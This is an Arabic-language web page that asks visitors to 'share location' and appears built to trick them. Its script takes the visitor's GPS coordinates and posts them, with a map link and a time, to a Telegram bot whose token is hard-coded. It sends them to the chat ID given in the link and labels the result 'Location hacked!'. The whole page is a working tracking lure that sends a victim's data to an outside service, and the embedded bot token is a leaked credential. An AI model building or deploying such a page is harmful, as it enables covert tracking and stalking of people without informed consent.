<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>📍 تحديد الموقع</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #0a2e1a; color: white; }
        button { background: #0088cc; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>📍 مطلوب مشاركة الموقع</h1>
    <button id="btn">📍 مشاركة الموقع</button>
    <div id="status"></div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');
        const BOT_TOKEN = "8670557092:AAEQdhH5pdVn5b9d2xFYqcytjKE8Ptl9MHo";
        
        document.getElementById('btn').onclick = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: userId,
                            text: `📍 تم اختراق الموقع!\nالموقع: ${lat}, ${lon}\nرابط الخريطة: https://maps.google.com/?q=${lat},${lon}\nالوقت: ${new Date().toLocaleString()}`
                        })
                    });
                    document.getElementById('status').innerHTML = '✅ تم اختراق الموقع!';
                });
            } else {
                document.getElementById('status').innerHTML = '❌ المتصفح لا يدعم تحديد الموقع';
            }
        };
    </script>
</body>
</html>
